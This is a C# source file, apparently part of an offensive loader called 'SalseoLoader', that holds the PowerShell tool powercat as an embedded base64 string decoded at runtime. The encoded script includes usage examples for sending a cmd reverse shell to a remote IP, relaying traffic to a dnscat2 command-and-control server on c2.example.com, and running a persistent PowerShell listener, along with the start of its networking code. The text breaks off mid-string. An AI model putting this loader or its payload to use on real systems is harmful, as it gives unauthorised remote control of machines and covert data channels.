using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace SalseoLoader
{
    class powercat
    {
        public static string powercatbase64()
        {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("ZnVuY3Rpb24gcG93ZXJjYXQgewogICAgcGFyYW0oCiAgICAgICAgW2FsaWFzKCJDbGllbnQiKV1bc3RyaW5nXSRjID0gIiIsCiAgICAgICAgW2FsaWFzKCJMaXN0ZW4iKV1bc3dpdGNoXSRsID0gJEZhbHNlLAogICAgICAgIFthbGlhcygiUG9ydCIpXVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAtMSldW3N0cmluZ10kcCA9ICIiLAogICAgICAgIFthbGlhcygiRXhlY3V0ZSIpXVtzdHJpbmddJGUgPSAiIiwKICAgICAgICBbYWxpYXMoIkV4ZWN1dGVQb3dlcnNoZWxsIildW3N3aXRjaF0kZXAgPSAkRmFsc2UsCiAgICAgICAgW2FsaWFzKCJSZWxheSIpXVtzdHJpbmddJHIgPSAiIiwKICAgICAgICBbYWxpYXMoIlVEUCIpXVtzd2l0Y2hdJHUgPSAkRmFsc2UsCiAgICAgICAgW2FsaWFzKCJkbnNjYXQyIildW3N0cmluZ10kZG5zID0gIiIsCiAgICAgICAgW2FsaWFzKCJETlNGYWlsdXJlVGhyZXNob2xkIildW2ludDMyXSRkbnNmdCA9IDEwLAogICAgICAgIFthbGlhcygiVGltZW91dCIpXVtpbnQzMl0kdCA9IDYwLAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSldW2FsaWFzKCJJbnB1dCIpXSRpID0gJG51bGwsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdIb3N0JywgJ0J5dGVzJywgJ1N0cmluZycpXVthbGlhcygiT3V0cHV0VHlwZSIpXVtzdHJpbmddJG8gPSAiSG9zdCIsCiAgICAgICAgW2FsaWFzKCJPdXRwdXRGaWxlIildW3N0cmluZ10kb2YgPSAiIiwKICAgICAgICBbYWxpYXMoIkRpc2Nvbm5lY3QiKV1bc3dpdGNoXSRkID0gJEZhbHNlLAogICAgICAgIFthbGlhcygiUmVwZWF0ZXIiKV1bc3dpdGNoXSRyZXAgPSAkRmFsc2UsCiAgICAgICAgW2FsaWFzKCJHZW5lcmF0ZVBheWxvYWQiKV1bc3dpdGNoXSRnID0gJEZhbHNlLAogICAgICAgIFthbGlhcygiR2VuZXJhdGVFbmNvZGVkIildW3N3aXRjaF0kZ2UgPSAkRmFsc2UsCiAgICAgICAgW2FsaWFzKCJIZWxwIildW3N3aXRjaF0kaCA9ICRGYWxzZSwKICAgICAgICBbc3dpdGNoXSRzc2wgPSAkRmFsc2UKICAgICkKICAKICAgICMjIyMjIyMjIyMjIyMjIyBIRUxQICMjIyMjIyMjIyMjIyMjIwogICAgJEhlbHAgPSAiCnBvd2VyY2F0IC0gTmV0Y2F0LCBUaGUgUG93ZXJzaGVsbCBWZXJzaW9uCkdpdGh1YiBSZXBvc2l0b3J5OiBodHRwczovL2dpdGh1Yi5jb20vYmVzaW1vcmhpbm8vcG93ZXJjYXQKClRoaXMgc2NyaXB0IGF0dGVtcHRzIHRvIGltcGxlbWVudCB0aGUgZmVhdHVyZXMgb2YgbmV0Y2F0IGluIGEgcG93ZXJzaGVsbApzY3JpcHQuIEl0IGFsc28gY29udGFpbnMgZXh0cmEgZmVhdHVyZXMgc3VjaCBhcyBidWlsdC1pbiByZWxheXMsIGV4ZWN1dGUKcG93ZXJzaGVsbCwgYW5kIGEgZG5zY2F0MiBjbGllbnQuCgpVc2FnZTogcG93ZXJjYXQgWy1jIG9yIC1sXSBbLXAgcG9ydF0gW29wdGlvbnNdCgogIC1jICA8aXA+ICAgICAgICBDbGllbnQgTW9kZS4gUHJvdmlkZSB0aGUgSVAgb2YgdGhlIHN5c3RlbSB5b3Ugd2lzaCB0byBjb25uZWN0IHRvLgogICAgICAgICAgICAgICAgICBJZiB5b3UgYXJlIHVzaW5nIC1kbnMsIHNwZWNpZnkgdGhlIEROUyBTZXJ2ZXIgdG8gc2VuZCBxdWVyaWVzIHRvLgogICAgICAgICAgICAKICAtbCAgICAgICAgICAgICAgTGlzdGVuIE1vZGUuIFN0YXJ0IGEgbGlzdGVuZXIgb24gdGhlIHBvcnQgc3BlY2lmaWVkIGJ5IC1wLgogIAogIC1wICA8cG9ydD4gICAgICBQb3J0LiBUaGUgcG9ydCB0byBjb25uZWN0IHRvLCBvciB0aGUgcG9ydCB0byBsaXN0ZW4gb24uCiAgCiAgLWUgIDxwcm9jPiAgICAgIEV4ZWN1dGUuIFNwZWNpZnkgdGhlIG5hbWUgb2YgdGhlIHByb2Nlc3MgdG8gc3RhcnQuCiAgCiAgLWVwICAgICAgICAgICAgIEV4ZWN1dGUgUG93ZXJzaGVsbC4gU3RhcnQgYSBwc2V1ZG8gcG93ZXJzaGVsbCBzZXNzaW9uLiBZb3UgY2FuCiAgICAgICAgICAgICAgICAgIGRlY2xhcmUgdmFyaWFibGVzIGFuZCBleGVjdXRlIGNvbW1hbmRzLCBidXQgaWYgeW91IHRyeSB0byBlbnRlcgogICAgICAgICAgICAgICAgICBhbm90aGVyIHNoZWxsIChuc2xvb2t1cCwgbmV0c2gsIGNtZCwgZXRjLikgdGhlIHNoZWxsIHdpbGwgaGFuZy4KICAgICAgICAgICAgCiAgLXIgIDxzdHI+ICAgICAgIFJlbGF5LiBVc2VkIGZvciByZWxheWluZyBuZXR3b3JrIHRyYWZmaWMgYmV0d2VlbiB0d28gbm9kZXMuCiAgICAgICAgICAgICAgICAgIENsaWVudCBSZWxheSBGb3JtYXQ6ICAgLXIgPHByb3RvY29sPjo8aXAgYWRkcj46PHBvcnQ+CiAgICAgICAgICAgICAgICAgIExpc3RlbmVyIFJlbGF5IEZvcm1hdDogLXIgPHByb3RvY29sPjo8cG9ydD4KICAgICAgICAgICAgICAgICAgRE5TQ2F0MiBSZWxheSBGb3JtYXQ6ICAtciBkbnM6PGRucyBzZXJ2ZXI+OjxkbnMgcG9ydD46PGRvbWFpbj4KICAgICAgICAgICAgCiAgLXUgICAgICAgICAgICAgIFVEUCBNb2RlLiBTZW5kIHRyYWZmaWMgb3ZlciBVRFAuIEJlY2F1c2UgaXQncyBVRFAsIHRoZSBjbGllbnQKICAgICAgICAgICAgICAgICAgbXVzdCBzZW5kIGRhdGEgYmVmb3JlIHRoZSBzZXJ2ZXIgY2FuIHJlc3BvbmQuCiAgICAgICAgICAgIAogIC1kbnMgIDxkb21haW4+ICBETlMgTW9kZS4gU2VuZCB0cmFmZmljIG92ZXIgdGhlIGRuc2NhdDIgZG5zIGNvdmVydCBjaGFubmVsLgogICAgICAgICAgICAgICAgICBTcGVjaWZ5IHRoZSBkbnMgc2VydmVyIHRvIC1jLCB0aGUgZG5zIHBvcnQgdG8gLXAsIGFuZCBzcGVjaWZ5IHRoZSAKICAgICAgICAgICAgICAgICAgZG9tYWluIHRvIHRoaXMgb3B0aW9uLCAtZG5zLiBUaGlzIGlzIG9ubHkgYSBjbGllbnQuCiAgICAgICAgICAgICAgICAgIEdldCB0aGUgc2VydmVyIGhlcmU6IGh0dHBzOi8vZ2l0aHViLmNvbS9pYWdveDg2L2Ruc2NhdDIKICAgICAgICAgICAgCiAgLWRuc2Z0IDxpbnQ+ICAgIEROUyBGYWlsdXJlIFRocmVzaG9sZC4gVGhpcyBpcyBob3cgbWFueSBiYWQgcGFja2V0cyB0aGUgY2xpZW50IGNhbgogICAgICAgICAgICAgICAgICByZWNpZXZlIGJlZm9yZSBleGl0aW5nLiBTZXQgdG8gemVybyB3aGVuIHJlY2VpdmluZyBmaWxlcywgYW5kIHNldCBoaWdoCiAgICAgICAgICAgICAgICAgIGZvciBtb3JlIHN0YWJpbGl0eSBvdmVyIHRoZSBpbnRlcm5ldC4KICAgICAgICAgICAgCiAgLXQgIDxpbnQ+ICAgICAgIFRpbWVvdXQuIFRoZSBudW1iZXIgb2Ygc2Vjb25kcyB0byB3YWl0IGJlZm9yZSBnaXZpbmcgdXAgb24gbGlzdGVuaW5nIG9yCiAgICAgICAgICAgICAgICAgIGNvbm5lY3RpbmcuIERlZmF1bHQ6IDYwCiAgICAgICAgICAgIAogIC1pICA8aW5wdXQ+ICAgICBJbnB1dC4gUHJvdmlkZSBkYXRhIHRvIGJlIHNlbnQgZG93biB0aGUgcGlwZSBhcyBzb29uIGFzIGEgY29ubmVjdGlvbiBpcwogICAgICAgICAgICAgICAgICBlc3RhYmxpc2hlZC4gVXNlZCBmb3IgbW92aW5nIGZpbGVzLiBZb3UgY2FuIHByb3ZpZGUgdGhlIHBhdGggdG8gYSBmaWxlLAogICAgICAgICAgICAgICAgICBhIGJ5dGUgYXJyYXkgb2JqZWN0LCBvciBhIHN0cmluZy4gWW91IGNhbiBhbHNvIHBpcGUgYW55IG9mIHRob3NlIGludG8KICAgICAgICAgICAgICAgICAgcG93ZXJjYXQsIGxpa2UgJ2FhYWFhYScgfCBwb3dlcmNhdCAtYyAxMC4xLjEuMSAtcCA4MAogICAgICAgICAgICAKICAtbyAgPHR5cGU+ICAgICAgT3V0cHV0LiBTcGVjaWZ5IGhvdyBwb3dlcmNhdCBzaG91bGQgcmV0dXJuIGluZm9ybWF0aW9uIHRvIHRoZSBjb25zb2xlLgogICAgICAgICAgICAgICAgICBWYWxpZCBvcHRpb25zIGFyZSAnQnl0ZXMnLCAnU3RyaW5nJywgb3IgJ0hvc3QnLiBEZWZhdWx0IGlzICdIb3N0Jy4KICAgICAgICAgICAgCiAgLW9mIDxwYXRoPiAgICAgIE91dHB1dCBGaWxlLiAgU3BlY2lmeSB0aGUgcGF0aCB0byBhIGZpbGUgdG8gd3JpdGUgb3V0cHV0IHRvLgogICAgICAgICAgICAKICAtZCAgICAgICAgICAgICAgRGlzY29ubmVjdC4gcG93ZXJjYXQgd2lsbCBkaXNjb25uZWN0IGFmdGVyIHRoZSBjb25uZWN0aW9uIGlzIGVzdGFibGlzaGVkCiAgICAgICAgICAgICAgICAgIGFuZCB0aGUgaW5wdXQgZnJvbSAtaSBpcyBzZW50LiBVc2VkIGZvciBzY2FubmluZy4KICAgICAgICAgICAgCiAgLXJlcCAgICAgICAgICAgIFJlcGVhdGVyLiBwb3dlcmNhdCB3aWxsIGNvbnRpbnVhbGx5IHJlc3RhcnQgYWZ0ZXIgaXQgaXMgZGlzY29ubmVjdGVkLgogICAgICAgICAgICAgICAgICBVc2VkIGZvciBzZXR0aW5nIHVwIGEgcGVyc2lzdGVudCBzZXJ2ZXIuCiAgICAgICAgICAgICAgICAgIAogIC1nICAgICAgICAgICAgICBHZW5lcmF0ZSBQYXlsb2FkLiAgUmV0dXJucyBhIHNjcmlwdCBhcyBhIHN0cmluZyB3aGljaCB3aWxsIGV4ZWN1dGUgdGhlCiAgICAgICAgICAgICAgICAgIHBvd2VyY2F0IHdpdGggdGhlIG9wdGlvbnMgeW91IGhhdmUgc3BlY2lmaWVkLiAtaSwgLWQsIGFuZCAtcmVwIHdpbGwgbm90CiAgICAgICAgICAgICAgICAgIGJlIGluY29ycG9yYXRlZC4KICAgICAgICAgICAgICAgICAgCiAgLWdlICAgICAgICAgICAgIEdlbmVyYXRlIEVuY29kZWQgUGF5bG9hZC4gRG9lcyB0aGUgc2FtZSBhcyAtZywgYnV0IHJldHVybnMgYSBzdHJpbmcgd2hpY2gKICAgICAgICAgICAgICAgICAgY2FuIGJlIGV4ZWN1dGVkIGluIHRoaXMgd2F5OiBwb3dlcnNoZWxsIC1FIDxlbmNvZGVkIHN0cmluZz4KCiAgLWggICAgICAgICAgICAgIFByaW50IHRoaXMgaGVscCBtZXNzYWdlLgoKRXhhbXBsZXM6CgogIExpc3RlbiBvbiBwb3J0IDgwMDAgYW5kIHByaW50IHRoZSBvdXRwdXQgdG8gdGhlIGNvbnNvbGUuCiAgICAgIHBvd2VyY2F0IC1sIC1wIDgwMDAKICAKICBDb25uZWN0IHRvIDEwLjEuMS4xIHBvcnQgNDQzLCBzZW5kIGEgc2hlbGwsIGFuZCBlbmFibGUgdmVyYm9zaXR5LgogICAgICBwb3dlcmNhdCAtYyAxMC4xLjEuMSAtcCA0NDMgLWUgY21kIC12CiAgCiAgQ29ubmVjdCB0byB0aGUgZG5zY2F0MiBzZXJ2ZXIgb24gYzIuZXhhbXBsZS5jb20sIGFuZCBzZW5kIGRucyBxdWVyaWVzCiAgdG8gdGhlIGRucyBzZXJ2ZXIgb24gMTAuMS4xLjEgcG9ydCA1My4KICAgICAgcG93ZXJjYXQgLWMgMTAuMS4xLjEgLXAgNTMgLWRucyBjMi5leGFtcGxlLmNvbQogIAogIFNlbmQgYSBmaWxlIHRvIDEwLjEuMS4xNSBwb3J0IDgwMDAuCiAgICAgIHBvd2VyY2F0IC1jIDEwLjEuMS4xNSAtcCA4MDAwIC1pIEM6XGlucHV0ZmlsZQogIAogIFdyaXRlIHRoZSBkYXRhIHNlbnQgdG8gdGhlIGxvY2FsIGxpc3RlbmVyIG9uIHBvcnQgNDQ0NCB0byBDOlxvdXRmaWxlCiAgICAgIHBvd2VyY2F0IC1sIC1wIDQ0NDQgLW9mIEM6XG91dGZpbGUKICAKICBMaXN0ZW4gb24gcG9ydCA4MDAwIGFuZCByZXBlYXRlZGx5IHNlcnZlciBhIHBvd2Vyc2hlbGwgc2hlbGwuCiAgICAgIHBvd2VyY2F0IC1sIC1wIDgwMDAgLWVwIC1yZXAKICAKICBSZWxheSB0cmFmZmljIGNvbWluZyBpbiBvbiBwb3J0IDgwMDAgb3ZlciB0Y3AgdG8gcG9ydCA5MDAwIG9uIDEwLjEuMS4xIG92ZXIgdGNwLgogICAgICBwb3dlcmNhdCAtbCAtcCA4MDAwIC1yIHRjcDoxMC4xLjEuMTo5MDAwCiAgICAgIAogIFJlbGF5IHRyYWZmaWMgY29taW5nIGluIG9uIHBvcnQgODAwMCBvdmVyIHRjcCB0byB0aGUgZG5zY2F0MiBzZXJ2ZXIgb24gYzIuZXhhbXBsZS5jb20sCiAgc2VuZGluZyBxdWVyaWVzIHRvIDEwLjEuMS4xIHBvcnQgNTMuCiAgICAgIHBvd2VyY2F0IC1sIC1wIDgwMDAgLXIgZG5zOjEwLjEuMS4xOjUzOmMyLmV4YW1wbGUuY29tCiIgICAKIAogICAgaWYgKCRoKSB7cmV0dXJuICRIZWxwfQogICAgIyMjIyMjIyMjIyMjIyMjIEhFTFAgIyMjIyMjIyMjIyMjIyMjCiAgCiAgICAjIyMjIyMjIyMjIyMjIyMgVkFMSURBVEUgQVJHUyAjIyMjIyMjIyMjIyMjIyMKICAgICRnbG9iYWw6VmVyYm9zZSA9ICRWZXJib3NlCiAgICBpZiAoJG9mIC1uZSAnJykgeyRvID0gJ0J5dGVzJ30KICAgIGlmICgkZG5zIC1lcSAiIikgewogICAgICAgIGlmICgoKCRjIC1lcSAiIikgLWFuZCAoISRsKSkgLW9yICgoJGMgLW5lICIiKSAtYW5kICRsKSkge3JldHVybiAiWW91IG11c3Qgc2VsZWN0IGVpdGhlciBjbGllbnQgbW9kZSAoLWMpIG9yIGxpc3RlbiBtb2RlICgtbCkuIn0KICAgICAgICBpZiAoJHAgLWVxICIiKSB7cmV0dXJuICJQbGVhc2UgcHJvdmlkZSBhIHBvcnQgbnVtYmVyIHRvIC1wLiJ9CiAgICB9CiAgICBpZiAoKCgoJHIgLW5lICIiKSAtYW5kICgkZSAtbmUgIiIpKSAtb3IgKCgkZSAtbmUgIiIpIC1hbmQgKCRlcCkpKSAtb3IgKCgkciAtbmUgIiIpIC1hbmQgKCRlcCkpKSB7cmV0dXJuICJZb3UgY2FuIG9ubHkgcGljayBvbmUgb2YgdGhlc2U6IC1lLCAtZXAsIC1yIn0KICAgIGlmICgoJGkgLW5lICRudWxsKSAtYW5kICgoJHIgLW5lICIiKSAtb3IgKCRlIC1uZSAiIikpKSB7cmV0dXJuICItaSBpcyBub3QgYXBwbGljYWJsZSBoZXJlLiJ9CiAgICBpZiAoJGwpIHsKICAgICAgICAkRmFpbHVyZSA9ICRGYWxzZQogICAgICAgIG5ldHN0YXQgLW5hIHwgU2VsZWN0LVN0cmluZyBMSVNURU5JTkcgfCAlIHtpZiAoKCRfLlRvU3RyaW5nKCkuc3BsaXQoIjoiKVsxXS5zcGxpdCgiICIpWzBdKSAtZXEgJHApIHtXcml0ZS1PdXRwdXQgKCJUaGUgc2VsZWN0ZWQgcG9ydCAiICsgJHAgKyAiIGlzIGFscmVhZHkgaW4gdXNlLiIpIDsgJEZhaWx1cmUgPSAkVHJ1ZX19CiAgICAgICAgaWYgKCRGYWlsdXJlKSB7YnJlYWt9CiAgICB9CiAgICBpZiAoJHIgLW5lICIiKSB7CiAgICAgICAgaWYgKCRyLnNwbGl0KCI6IikuQ291bnQgLWVxIDIpIHsKICAgICAgICAgICAgJEZhaWx1cmUgPSAkRmFsc2UKICAgICAgICAgICAgbmV0c3RhdCAtbmEgfCBTZWxlY3QtU3RyaW5nIExJU1RFTklORyB8ICUge2lmICgoJF8uVG9TdHJpbmcoKS5zcGxpdCgiOiIpWzFdLnNwbGl0KCIgIilbMF0pIC1lcSAkci5zcGxpdCgiOiIpWzFdKSB7V3JpdGUtT3V0cHV0ICgiVGhlIHNlbGVjdGVkIHBvcnQgIiArICRyLnNwbGl0KCI6IilbMV0gKyAiIGlzIGFscmVhZHkgaW4gdXNlLiIpIDsgJEZhaWx1cmUgPSAkVHJ1ZX19CiAgICAgICAgICAgIGlmICgkRmFpbHVyZSkge2JyZWFrfQogICAgICAgIH0KICAgIH0KICAgICMjIyMjIyMjIyMjIyMjIyBWQUxJREFURSBBUkdTICMjIyMjIyMjIyMjIyMjIwogIAogICAgIyMjIyMjIyMjIyMjIyMjIFVEUCBGVU5DVElPTlMgIyMjIyMjIyMjIyMjIyMjCiAgICBmdW5jdGlvbiBTZXR1cF9VRFAgewogICAgICAgIHBhcmFtKCRGdW5jU2V0dXBWYXJzKQogICAgICAgIGlmICgkZ2xvYmFsOlZlcmJvc2UpIHskVmVyYm9zZSA9ICRUcnVlfQogICAgICAgICRjLCAkbCwgJHAsICR0ID0gJEZ1bmNTZXR1cFZhcnMKICAgICAgICAkRnVuY1ZhcnMgPSBAe30KICAgICAgICAkRnVuY1ZhcnNbIkVuY29kaW5nIl0gPSBOZXctT2JqZWN0IFN5c3RlbS5UZXh0LkFzY2lpRW5jb2RpbmcKICAgICAgICBpZiAoJGwpIHsKICAgICAgICAgICAgJFNvY2tldERlc3RpbmF0aW9uQnVmZmVyID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDY1NTM2CiAgICAgICAgICAgICRFbmRQb2ludCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5JUEVuZFBvaW50IChbU3lzdGVtLk5ldC5JUEFkZHJlc3NdOjpBbnkpLCAkcAogICAgICAgICAgICAkRnVuY1ZhcnNbIlNvY2tldCJdID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVURQQ2xpZW50ICRwCiAgICAgICAgICAgICRQYWNrZXRJbmZvID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuSVBQYWNrZXRJbmZvcm1hdGlvbgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICgiTGlzdGVuaW5nIG9uIFswLjAuMC4wXSBwb3J0ICIgKyAkcCArICIgW3VkcF0iKQogICAgICAgICAgICAkQ29ubmVjdEhhbmRsZSA9ICRGdW5jVmFyc1siU29ja2V0Il0uQ2xpZW50LkJlZ2luUmVjZWl2ZU1lc3NhZ2VGcm9tKCRTb2NrZXREZXN0aW5hdGlvbkJ1ZmZlciwgMCwgNjU1MzYsIFtTeXN0ZW0uTmV0LlNvY2tldHMuU29ja2V0RmxhZ3NdOjpOb25lLCBbcmVmXSRFbmRQb2ludCwgJG51bGwsICRudWxsKQogICAgICAgICAgICAkU3RvcHdhdGNoID0gW1N5c3RlbS5EaWFnbm9zdGljcy5TdG9wd2F0Y2hdOjpTdGFydE5ldygpCiAgICAgICAgICAgIHdoaWxlICgkVHJ1ZSkgewogICAgICAgICAgICAgICAgaWYgKCRIb3N0LlVJLlJhd1VJLktleUF2YWlsYWJsZSkgewogICAgICAgICAgICAgICAgICAgIGlmIChAKDE3LCAyNykgLWNvbnRhaW5zICgkSG9zdC5VSS5SYXdVSS5SZWFkS2V5KCJOb0VjaG8sSW5jbHVkZUtleURvd24iKS5WaXJ0dWFsS2V5Q29kZSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ1RSTCBvciBFU0MgY2F1Z2h0LiBTdG9wcGluZyBVRFAgU2V0dXAuLi4iCiAgICAgICAgICAgICAgICAgICAgICAgICRGdW5jVmFyc1siU29ja2V0Il0uQ2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICAkU3RvcHdhdGNoLlN0b3AoKQogICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkU3RvcHdhdGNoLkVsYXBzZWQuVG90YWxTZWNvbmRzIC1ndCAkdCkgewogICAgICAgICAgICAgICAgICAgICRGdW5jVmFyc1siU29ja2V0Il0uQ2xvc2UoKQogICAgICAgICAgICAgICAgICAgICRTdG9wd2F0Y2guU3RvcCgpCiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiVGltZW91dCEiIDsgYnJlYWsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkQ29ubmVjdEhhbmRsZS5Jc0NvbXBsZXRlZCkgewogICAgICAgICAgICAgICAgICAgICRTb2NrZXRCeXRlc1JlYWQgPSAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsaWVudC5FbmRSZWNlaXZlTWVzc2FnZUZyb20oJENvbm5lY3RIYW5kbGUsIFtyZWZdKFtTeXN0ZW0uTmV0LlNvY2tldHMuU29ja2V0RmxhZ3NdOjpOb25lKSwgW3JlZl0kRW5kUG9pbnQsIFtyZWZdJFBhY2tldEluZm8pCiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAoIkNvbm5lY3Rpb24gZnJvbSBbIiArICRFbmRQb2ludC5BZGRyZXNzLklQQWRkcmVzc1RvU3RyaW5nICsgIl0gcG9ydCAiICsgJHAgKyAiIFt1ZHBdIGFjY2VwdGVkIChzb3VyY2UgcG9ydCAiICsgJEVuZFBvaW50LlBvcnQgKyAiKSIpCiAgICAgICAgICAgICAgICAgICAgaWYgKCRTb2NrZXRCeXRlc1JlYWQgLWd0IDApIHticmVha30KICAgICAgICAgICAgICAgICAgICBlbHNlIHticmVha30KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkU3RvcHdhdGNoLlN0b3AoKQogICAgICAgICAgICAkRnVuY1ZhcnNbIkluaXRpYWxDb25uZWN0aW9uQnl0ZXMiXSA9ICRTb2NrZXREZXN0aW5hdGlvbkJ1ZmZlclswLi4oW2ludF0kU29ja2V0Qnl0ZXNSZWFkIC0gMSldCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBpZiAoISRjLkNvbnRhaW5zKCIuIikpIHsKICAgICAgICAgICAgICAgICRJUExpc3QgPSBAKCkKICAgICAgICAgICAgICAgIFtTeXN0ZW0uTmV0LkRuc106OkdldEhvc3RBZGRyZXNzZXMoJGMpIHwgV2hlcmUtT2JqZWN0IHskXy5BZGRyZXNzRmFtaWx5IC1lcSAiSW50ZXJOZXR3b3JrIn0gfCAlIHskSVBMaXN0ICs9ICRfLklQQWRkcmVzc1RvU3RyaW5nfQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAoIk5hbWUgIiArICRjICsgIiByZXNvbHZlZCB0byBhZGRyZXNzICIgKyAkSVBMaXN0WzBdKQogICAgICAgICAgICAgICAgJEVuZFBvaW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LklQRW5kUG9pbnQgKFtTeXN0ZW0uTmV0LklQQWRkcmVzc106OlBhcnNlKCRJUExpc3RbMF0pKSwgJHAKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRFbmRQb2ludCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5JUEVuZFBvaW50IChbU3lzdGVtLk5ldC5JUEFkZHJlc3NdOjpQYXJzZSgkYykpLCAkcAogICAgICAgICAgICB9CiAgICAgICAgICAgICRGdW5jVmFyc1siU29ja2V0Il0gPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5VRFBDbGllbnQKICAgICAgICAgICAgJEZ1bmNWYXJzWyJTb2NrZXQiXS5Db25uZWN0KCRjLCAkcCkKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAoIlNlbmRpbmcgVURQIHRyYWZmaWMgdG8gIiArICRjICsgIiBwb3J0ICIgKyAkcCArICIuLi4iKQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICgiVURQOiBNYWtlIHN1cmUgdG8gc2VuZCBzb21lIGRhdGEgc28gdGhlIHNlcnZlciBjYW4gbm90aWNlIHlvdSEiKQogICAgICAgIH0KICAgICAgICAkRnVuY1ZhcnNbIkJ1ZmZlclNpemUiXSA9IDY1NTM2CiAgICAgICAgJEZ1bmNWYXJzWyJFbmRQb2ludCJdID0gJEVuZFBvaW50CiAgICAgICAgJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdCiAgICAgICAgJEZ1bmNWYXJzWyJTdHJlYW1SZWFkT3BlcmF0aW9uIl0gPSAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsaWVudC5CZWdpblJlY2VpdmVGcm9tKCRGdW5jVmFyc1siU3RyZWFtRGVzdGluYXRpb25CdWZmZXIiXSwgMCwgJEZ1bmNWYXJzWyJCdWZmZXJTaXplIl0sIChbU3lzdGVtLk5ldC5Tb2NrZXRzLlNvY2tldEZsYWdzXTo6Tm9uZSksIFtyZWZdJEZ1bmNWYXJzWyJFbmRQb2ludCJdLCAkbnVsbCwgJG51bGwpCiAgICAgICAgcmV0dXJuICRGdW5jVmFycwogICAgfQogICAgZnVuY3Rpb24gUmVhZERhdGFfVURQIHsKICAgICAgICBwYXJhbSgkRnVuY1ZhcnMpCiAgICAgICAgJERhdGEgPSAkbnVsbAogICAgICAgIGlmICgkRnVuY1ZhcnNbIlN0cmVhbVJlYWRPcGVyYXRpb24iXS5Jc0NvbXBsZXRlZCkgewogICAgICAgICAgICAkU3RyZWFtQnl0ZXNSZWFkID0gJEZ1bmNWYXJzWyJTb2NrZXQiXS5DbGllbnQuRW5kUmVjZWl2ZUZyb20oJEZ1bmNWYXJzWyJTdHJlYW1SZWFkT3BlcmF0aW9uIl0sIFtyZWZdJEZ1bmNWYXJzWyJFbmRQb2ludCJdKQogICAgICAgICAgICBpZiAoJFN0cmVhbUJ5dGVzUmVhZCAtZXEgMCkge2JyZWFrfQogICAgICAgICAgICAkRGF0YSA9ICRGdW5jVmFyc1siU3RyZWFtRGVzdGluYXRpb25CdWZmZXIiXVswLi4oW2ludF0kU3RyZWFtQnl0ZXNSZWFkIC0gMSldCiAgICAgICAgICAgICRGdW5jVmFyc1siU3RyZWFtUmVhZE9wZXJhdGlvbiJdID0gJEZ1bmNWYXJzWyJTb2NrZXQiXS5DbGllbnQuQmVnaW5SZWNlaXZlRnJvbSgkRnVuY1ZhcnNbIlN0cmVhbURlc3RpbmF0aW9uQnVmZmVyIl0sIDAsICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdLCAoW1N5c3RlbS5OZXQuU29ja2V0cy5Tb2NrZXRGbGFnc106Ok5vbmUpLCBbcmVmXSRGdW5jVmFyc1siRW5kUG9pbnQiXSwgJG51bGwsICRudWxsKQogICAgICAgIH0KICAgICAgICByZXR1cm4gJERhdGEsICRGdW5jVmFycwogICAgfQogICAgZnVuY3Rpb24gV3JpdGVEYXRhX1VEUCB7CiAgICAgICAgcGFyYW0oJERhdGEsICRGdW5jVmFycykKICAgICAgICAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsaWVudC5TZW5kVG8oJERhdGEsICRGdW5jVmFyc1siRW5kUG9pbnQiXSkgfCBPdXQtTnVsbAogICAgICAgIHJldHVybiAkRnVuY1ZhcnMKICAgIH0KICAgIGZ1bmN0aW9uIENsb3NlX1VEUCB7CiAgICAgICAgcGFyYW0oJEZ1bmNWYXJzKQogICAgICAgICRGdW5jVmFyc1siU29ja2V0Il0uQ2xvc2UoKQogICAgfQogICAgIyMjIyMjIyMjIyMjIyMjIFVEUCBGVU5DVElPTlMgIyMjIyMjIyMjIyMjIyMjCiAgCiAgICAjIyMjIyMjIyMjIyMjIyMgRE5TIEZVTkNUSU9OUyAjIyMjIyMjIyMjIyMjIyMKICAgIGZ1bmN0aW9uIFNldHVwX0ROUyB7CiAgICAgICAgcGFyYW0oJEZ1bmNTZXR1cFZhcnMpCiAgICAgICAgaWYgKCRnbG9iYWw6VmVyYm9zZSkgeyRWZXJib3NlID0gJFRydWV9CiAgICAgICAgZnVuY3Rpb24gQ29udmVydFRvLUhleEFycmF5IHsKICAgICAgICAgICAgcGFyYW0oJFN0cmluZykKICAgICAgICAgICAgJEhleCA9IEAoKQogICAgICAgICAgICAkU3RyaW5nLlRvQ2hhckFycmF5KCkgfCAlIHsiezA6eH0iIC1mIFtieXRlXSRffSB8ICUge2lmICgkXy5MZW5ndGggLWVxIDEpIHsiMCIgKyBbc3RyaW5nXSRffSBlbH